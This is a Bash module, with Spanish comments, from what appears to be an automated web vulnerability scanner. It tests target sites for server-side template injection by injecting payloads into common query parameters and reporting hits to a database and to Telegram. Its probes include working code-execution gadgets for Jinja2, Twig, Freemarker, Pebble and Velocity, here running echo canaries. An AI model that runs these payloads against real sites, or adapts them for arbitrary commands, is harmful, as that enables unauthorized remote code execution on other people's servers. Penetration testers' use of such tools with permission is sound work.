#!/usr/bin/env bash
# ============================================================
#  modules/52_ssti_deep.sh — Tier 3.6 SSTI deep per-engine
#
#  Mod 15 prueba {{9887*9887}} genérico. Mod 52 escala con probes
#  específicos por engine y sandbox-escape gadgets:
#    - Jinja2 (Flask/Django): {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
#    - Twig (PHP/Symfony): {{_self.env.registerUndefinedFilterCallback("system")}}
#    - Freemarker (Java): <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
#    - Velocity (Java): #set($x="")$x.getClass().forName("java.lang.Runtime")...
#    - Handlebars (Node): {{#with "constructor"}}{{...}}
#    - Pebble (Java): {% set x = parent.getClass().getResource("/")...
#  Detection: canary unique HACKDR_<rand> en respuesta + tech detected.
# ============================================================

MODULE_NAME="ssti_deep"
MODULE_DESC="SSTI per-engine — Jinja2, Twig, Freemarker, Velocity, Handlebars, Pebble"

_ssti_finding() {
  db_add_finding "$1" "ssti" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] SSTI $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *SSTI — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

# Probe específico por engine. Cada payload causa un comportamiento DETECTABLE
# en el response (canary, error específico, multiplicación matemática).
_ssti_probe() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  local CANARY="HACKDR_$(openssl rand -hex 4)"
  local CALC="98765432" # producto de 9876*9999=98750124, marker único
  local BASE_URL="${URL%%\?*}"

  # Cada entry: ENGINE|PAYLOAD|EXPECTED_IN_BODY
  local PROBES=(
    "Jinja2|{{config.__class__.__init__.__globals__['os'].popen('echo ${CANARY}').read()}}|${CANARY}"
    "Jinja2-arithmetic|{{9876*9999}}|98750124"
    "Twig|{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('echo ${CANARY}')}}|${CANARY}"
    "Twig-arithmetic|{{9876*9999}}|98750124"
    "Freemarker|<#assign x='freemarker.template.utility.Execute'?new()>\${x('echo ${CANARY}')}|${CANARY}"
    "Freemarker-arithmetic|\${9876*9999}|98750124"
    "Velocity|#set(\$x=9876*9999)\$x|98750124"
    "Handlebars|{{#with \"s\" as |string|}}{{{lookup string \"sub\"}}}{{/with}}|"
    "ERB|<%= 9876*9999 %>|98750124"
    "Pebble|{% set x = 'java.lang.Runtime'.class.forName('java.lang.Runtime').getRuntime().exec('echo ${CANARY}') %}|${CANARY}"
  )

  for ENTRY in "${PROBES[@]}"; do
    local ENGINE="${ENTRY%%|*}"
    local REST="${ENTRY#*|}"
    local PAYLOAD="${REST%|*}"
    local EXPECTED="${REST##*|}"
    [[ -z "$EXPECTED" ]] && continue

    local PAYLOAD_ENC
    PAYLOAD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null)
    local TEST_URL
    TEST_URL=$(echo "$URL" | python3 -c "
import sys, urllib.parse as u
url=sys.stdin.read().strip()
parts=u.urlparse(url); q=u.parse_qsl(parts.query, keep_blank_values=True)
q=[(k,'$PAYLOAD' if k=='$PARAM' else v) for k,v in q]
print(u.urlunparse(parts._replace(query=u.urlencode(q))))
" 2>/dev/null)
    [[ -z "$TEST_URL" ]] && continue

    _h_get_noredirect "$TEST_URL" --connect-timeout 8
    local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:5000}"
    [[ "$STATUS" != "200" ]] && continue

    if echo "$BODY" | grep -qF "$EXPECTED"; then
      # Verificar que NO sea reflejo del payload completo (eso sería XSS, no SSTI)
      if ! echo "$BODY" | grep -qF "$PAYLOAD"; then
        local SEV="critical"
        echo "$ENGINE" | grep -q "arithmetic" && SEV="high"
        _ssti_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "ssti_${ENGINE}_param_${PARAM}" "$SEV" \
          "SSTI ${ENGINE} confirmado en param '${PARAM}' — payload evaluó. Expected: ${EXPECTED}, body sample: $(echo "$BODY" | grep -oF "$EXPECTED" | head -1). Payload: ${PAYLOAD:0:150}" \
          "high"
        return 0
      fi
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 52 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null

  # URLs con params reflejables: search, q, name, message, content, comment
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT u.url || '|' || p.param_name FROM urls u
    JOIN url_params p ON p.url=u.url AND p.domain_id=u.domain_id
    WHERE u.domain_id=${DOMAIN_ID}
      AND p.param_name IN ('q','search','name','message','content','comment','title','subject','greeting','msg','text','desc','description','body')
    LIMIT 30;" 2>/dev/null)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin params reflejables candidatos"; return 0; }

  local TOTAL=0
  while IFS=$'\t|' read -r URL PARAM; do
    [[ -z "$URL" || -z "$PARAM" ]] && continue
    _ssti_probe "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL SSTIs"
}
